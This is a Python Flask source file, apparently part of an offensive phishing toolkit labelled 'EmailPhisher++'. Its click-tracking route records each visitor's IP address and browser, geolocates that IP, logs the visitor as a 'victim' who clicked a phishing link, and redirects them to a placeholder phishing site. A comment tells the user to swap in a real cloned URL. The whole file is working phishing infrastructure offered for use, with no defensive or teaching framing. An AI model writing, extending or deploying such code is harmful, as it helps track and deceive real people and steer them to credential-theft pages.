from flask import Flask, request, redirect
import sys, os

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.logger import log_event
from core.ip_locator import get_ip_info  # ✅ Import IP locator

app = Flask(__name__)

@app.route('/click')
def track_click():
    victim_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    ip_info = get_ip_info(victim_ip)  # ✅ Get location info

    log_event({
        "module": "EmailPhisher++",
        "event": "Victim clicked phishing link",
        "ip": victim_ip,
        "city": ip_info.get("city"),
        "country": ip_info.get("country"),
        "org": ip_info.get("org"),
        "user_agent": user_agent
    })

    # ✅ Redirect to your phishing site or decoy
    return redirect("https://your-phishing-site.com")  # 👈 Replace with real cloned URL

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5002)

